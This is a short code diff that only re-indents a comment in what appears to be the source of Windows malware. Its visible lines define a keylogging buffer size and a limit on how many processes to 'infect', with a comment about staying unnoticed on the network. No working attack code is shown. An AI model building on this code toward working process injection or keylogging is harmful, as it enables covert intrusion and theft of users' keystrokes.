@@ -16,7 +16,7 @@
 #define ERROR_EXIT_STATUS -1
 #define LOGGED_KEY_BUF_SIZE 15
 #define TARGET_PROC_LIMIT 10 //The more processes we infect, the higher chance of success, 
-							 //but it's also more likely to draw attention on the network.
+			     //but it's also more likely to draw attention on the network.
 
 BOOL presentInList(DWORD procID);
 DWORD HermesCore();
